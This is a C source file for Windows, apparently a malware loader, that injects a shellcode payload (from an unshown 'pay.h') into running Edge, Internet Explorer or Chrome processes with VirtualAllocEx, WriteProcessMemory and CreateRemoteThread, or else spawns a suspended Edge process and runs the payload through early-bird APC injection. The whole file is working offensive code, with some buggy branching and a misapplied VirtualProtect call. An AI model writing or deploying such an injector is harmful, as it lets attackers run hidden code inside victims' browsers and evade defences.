#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "pay.h"



int FindTarget(LPCWSTR procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpW(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;


}

int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;


    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);

    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}


int main(int argc, char* argv[])
{
    

    HANDLE hProc = NULL;



    int pid = 0;
    pid = FindTarget(L"msedge.exe");
    printf("msedge.exe PID = %d\n", pid);
    getchar();

    if (pid == 0)
    {
        printf("msedge process not found, looking for iexplore.exe");
        pid = FindTarget(L"iexplore.exe");
        printf("iexplore.exe PID = %d\n", pid);
        getchar();
    }
    else
    {
        printf("iexplore.exe process not found, looking for chrome.exe");
        pid = FindTarget(L"chrome.exe");
        printf("chrome.exe PID = %d\n", pid);
        getchar();
    }

 
    if (pid) {
        
        getchar();

        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE, (DWORD)pid);

        if (hProc != NULL) {
            Inject(hProc, payload, payload_len);
            CloseHandle(hProc);
        }
    }
    else
    {
        printf("no edge/chrome/ie instance running; moving to create a edge instance \n");

        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        void* pRemoteCode;
        LPVOID baseAddress = NULL;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        
        //CreateProcessA(0, (LPSTR)"C:\\Program Files\\Internet Explorer\\iexplore.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, (LPSTARTUPINFOA)&si, &pi);
        CreateProcessA(0, (LPSTR)"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, (LPSTARTUPINFOA)&si, &pi);

        pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        printf("created msedge.exe processid PID = %d\n", pi.dwProcessId);
        getchar();

        WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);

        DWORD oldProtect1;
        VirtualProtect(pRemoteCode, (SIZE_T)payload_len, PAGE_EXECUTE_READ, &oldProtect1);

        QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);

        printf("remcode = %p\nReady to roll!\n", pRemoteCode);
        getchar();
        ResumeThread(pi.hThread);

    }
    return 0;
}


